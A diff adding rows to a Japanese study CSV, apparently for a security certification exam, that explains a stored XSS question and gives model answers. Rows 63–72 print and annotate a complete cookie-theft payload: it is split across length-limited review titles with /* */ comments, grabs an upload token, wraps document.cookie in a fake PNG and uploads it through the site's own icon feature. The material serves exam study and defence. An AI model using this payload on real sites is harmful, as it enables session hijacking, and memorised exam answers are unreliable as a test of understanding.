@@ -1068,3 +1068,204 @@ Strict-Transport-Security：WebブラウザにHTTPS接続を強制し、HTTPに�
 X-Content-Type-Options：Content-Typeで指定されたMIMEタイプを強制し、ブラウザによるファイル形式の推測（MIMEスニッフィング）を防ぐ。
 
 MIMEタイプ（マイムタイプ）とは、データの種類や形式を示す識別情報です。Webサーバがブラウザに「このファイルはHTMLです」「これは画像です」などと知らせるために使います。MIMEタイプは、HTTPレスポンスヘッダーの「Content-Type」に書かれています。"
+61,"（1）XSS 脆弱性の種類を解答群の中から選び、記号で答えよ。
+
+解答群
+
+ア　DOM Based XSS
+イ　格納型 XSS
+ウ　反射型 XSS","設問1の(1)は「イ：格納型XSS」、(2)は「レビュータイトルを出力する前にエスケープ処理を施す」が正解です。
+
+(1) なぜ格納型XSSなのか
+図3を見ると、会員Aが投稿したレビュータイトルに、次のようなスクリプトが埋め込まれています。
+<script>new XMLHttpRequest();</script>
+実際には、図3にはほかにも悪意のあるスクリプトが含まれています。
+
+攻撃の流れは次のとおりです。
+① 攻撃者Aがレビュータイトルに悪意のあるJavaScriptを入力する。
+② WebアプリQが、そのレビュータイトルをサーバ側に保存する。
+③ 別の会員Nがレビューページを開く。
+④ 保存されていたレビュータイトルがHTMLに埋め込まれ、NのブラウザでJavaScriptが実行される。
+
+このように、攻撃コードがサーバ側に保存（格納）され、ページを閲覧した利用者のブラウザで実行されるため、「格納型XSS」です。
+
+今回の問題では、攻撃者AがレビュータイトルにJavaScriptを埋め込み、それをサーバに保存させています。　← どこで保存させている？
+
+問題文には「データベースに保存した」という明示的な記述はありません。レビューが投稿後も表示されることから、サーバ側に保存されていると判断できます。
+"
+62,Web アプリ Q における対策を，30 字以内で答えよ。,"正解：「レビュータイトルを出力する前にエスケープ処理を施す。」　← 定石
+攻撃がXSSなら、何も考えずにこれを書く。
+
+"
+63,"<div class=""review-title"">Good<script>xhr=new XMLHttpRequest();</div>
+
+<div class=""review-title"">*/xhr2.send(form);</script></div>","ここが攻撃の始まりです。
+本来はレビュータイトルを表示する場所ですが、会員Aは <script> を入力しています。
+<script> はJavaScriptを開始するHTMLタグです。
+ただし、この時点では </script> がありません。したがって、JavaScriptの処理はまだ実行されず、後続のHTMLもスクリプトの内容として読み込まれます。
+
+*/ はコメントを終了する記号です。
+xhr2.send(form); はHTTPリクエストを送信するJavaScriptです。
+</script> でスクリプトを終了します。
+つまり、複数のレビュータイトルに分けて埋め込まれたJavaScriptが、ここで完成します。"
+64,えっと、このHTMLのいくつかの部分をコメントにして表示しなくなっているっていうのはわかる。ただこれ何のため。,"目的は、レビュータイトルに分割して埋め込んだJavaScriptを、途中のHTMLに邪魔されずに実行させるためです。
+
+例えば、攻撃者が1件目のレビュータイトルに <script> を入れると、ブラウザはそこから先をJavaScriptとして解釈し始めます。
+
+ところが、その後には次のようなHTMLが続きます。
+</div>
+<div class=""review"">
+<div class=""displayname"">会員A</div>
+
+これらはHTMLとしては正常ですが、JavaScriptとしては構文エラーの原因になります。
+
+そこで攻撃者は、/* と */ を使って、不要なHTMLをJavaScriptのコメントとして無視させます。
+つまり、
+① レビュータイトル内のJavaScriptを実行させたい。
+② しかし、レビューとレビューの間には余計なHTMLがある。
+③ そのHTMLをコメントにして、JavaScriptの構文エラーを防ぐ。
+④ 次のレビュータイトルでJavaScriptの処理を続ける。
+という仕組みです。
+
+重要なのは、コメントにしている目的が「HTMLを画面に表示しないため」ではないことです。
+「複数のレビュータイトルに分割した攻撃コードを、1本のJavaScriptとして成立させるため」です。
+なお、/* ... */ はJavaScriptのコメントであり、HTMLのコメント <!-- ... --> とは異なります。"
+65,なぜ複数回に分けて書くんだ。長いJavaを、Javaのスクリプトを入れちゃいけないのか。,"理由は、レビュータイトルに「50文字以内」という文字数制限があるからです。
+問題文の図1に、レビュータイトルは50文字以内と書かれています。
+攻撃者は、長いJavaScriptを1件のレビュータイトルに入力できません。
+そこで、JavaScriptを15件のレビュータイトルに分割して投稿したのです。"
+66,"行目
+xhr.responseType = ""document"";","サーバから返されたHTMLを、単なる文字列ではなくDOMとして扱う設定です。これによって、HTML内の特定の要素を検索できます。
+
+違いは、「単なる文字列」は文字の並びにすぎないのに対し、「DOM」はHTMLを解析して、タグや要素の親子関係まで認識したデータ構造だということです。。"
+67,"5行目
+xhr.send();",GETリクエストを送信します。
+68,"xhr.onload = function() {
+page = xhr.response;
+token = page.getElementById(""token"").value;
+","6〜8行目：アップロード用トークンを取得する
+6行目
+xhr.onload = function() {
+
+GETのレスポンスを受信した後に実行する処理を定義します。なお、問題文の注記では受信成功後に実行されるものとされています。
+
+7行目
+page = xhr.response;
+
+取得したプロフィールページのHTML（DOM）をpageに代入します。
+
+8行目
+token = page.getElementById(""token"").value;
+
+プロフィールページ内のIDが token の要素を探し、その値を取り出します。
+図1では、画像アップロード時に、このトークンを送信する必要があると説明されています。
+つまり、攻撃者は正規のページからトークンを取得し、画像アップロードに利用しようとしています。"
+69,"xhr2 = new XMLHttpRequest();
+url2 = ""https://□□□.co.jp/user/upload"";
+xhr2.open(""post"", url2);
+form = new FormData();
+","9〜12行目：画像アップロードの準備をする
+9行目
+xhr2 = new XMLHttpRequest();
+2回目のHTTP通信を行うオブジェクトを作成します。
+
+10行目
+url2 = ""https://□□□.co.jp/user/upload"";
+画像アップロード先のURLを設定します。
+
+11行目
+xhr2.open(""post"", url2);
+POSTメソッドによる送信を準備します。
+
+12行目
+form = new FormData();
+"
+70,"cookie = document.cookie;
+fname = ""a.png"";
+ftype = ""image/png"";
+file = new File([cookie], fname, {type: ftype});
+","フォームデータを作成します。画像ファイルやトークンをまとめて送信するための入れ物です。
+13〜16行目：Cookieを偽の画像ファイルにする
+13行目
+cookie = document.cookie;
+会員Nのブラウザから、JavaScriptで読み取れるCookieを取得します。
+図1によれば、ログイン時のセッションIDはCookieとして払い出されます。また、問題文にはHttpOnly属性が設定されていないとあります。
+そのため、セッションIDを含むCookieをJavaScriptで読み取ることができます。
+
+14行目
+fname = ""a.png"";
+ファイル名をa.pngに設定します。
+
+15行目
+ftype = ""image/png"";
+ファイルのMIMEタイプをPNG画像に設定します。
+
+16行目
+file = new File([cookie], fname, {type: ftype});
+ここが重要です。
+13行目で取得したCookieの文字列を、a.pngというファイルの内容として格納します。
+つまり、実際のPNG画像ではなく、Cookie情報が入ったファイルを作成しています。
+"
+71,"form.append(""uploadfile"", file);
+form.append(""token"", token);
+xhr2.send(form);
+","17〜20行目：Cookie情報をアップロードする
+17行目
+form.append(""uploadfile"", file);
+フォームデータに、16行目で作ったファイルを追加します。
+図1では画像アップロード用パラメータの名前がuploadfileと指定されています。
+
+18行目
+form.append(""token"", token);
+8行目で取得したトークンをフォームデータに追加します。
+図1では、アップロード時に正しいトークンを送らなければ成功しないとあります。
+
+19行目
+xhr2.send(form);
+ファイルとトークンを含むPOSTリクエストを送信します。
+結果として、会員NのCookie情報を含むa.pngが、会員Nのアイコン画像としてアップロードされます。
+
+"
+72,"1:  xhr = new XMLHttpRequest();
+2:  url1 = ""https://□□□.co.jp/user/profile"";
+3:  xhr.open(""get"", url1);
+4:  xhr.responseType = ""document"";  // レスポンスをテキストではなくDOMとして受信する。
+5:  xhr.send();
+6:  xhr.onload = function() {  // 以降は、1回目のXMLHttpRequest(XHR)のレスポンス
+    の受信に成功してから実行される。
+7:      page = xhr.response;
+8:      token = page.getElementById(""token"").value;
+9:      xhr2 = new XMLHttpRequest();
+10:     url2 = ""https://□□□.co.jp/user/upload"";
+11:     xhr2.open(""post"", url2);
+12:     form = new FormData();
+13:     cookie = document.cookie;
+14:     fname = ""a.png"";
+15:     ftype = ""image/png"";
+16:     file = new File([cookie], fname, {type: ftype});
+        // アップロードするファイルオブジェクト
+        // 第1引数：ファイルコンテンツ
+        // 第2引数：ファイル名
+        // 第3引数：MIMEタイプなどのオプション
+17:     form.append(""uploadfile"", file);
+18:     form.append(""token"", token);
+19:     xhr2.send(form);
+20: }","攻撃全体の流れ
+会員Nが商品レビューページを開く
+会員Aが埋め込んだJavaScriptが実行される
+1〜8行目
+プロフィールページからトークンを取得
+
+9〜16行目
+Cookieを読み取り、a.pngという偽の画像ファイルを作成
+
+17〜19行目
+ファイルとトークンをWebアプリQに送信
+Cookie情報が会員Nのアイコン画像として保存される
+
+ここで特に重要なのは、攻撃者が自分のサーバにCookieを直接送信していないことです。
+WebアプリQの正規の画像アップロード機能を悪用して、Cookie情報をサーバに保存させています。
+
+そして図1によれば、アップロードされたアイコン画像はレビューページにも表示される仕組みです。攻撃者はその画像ファイルを取得することで、Cookie情報を盗み出せる可能性があります。
+
+試験対策としては、8行目のトークン取得、13行目のCookie取得、16行目の偽画像作成、19行目のアップロード、この4か所が特に重要です。"
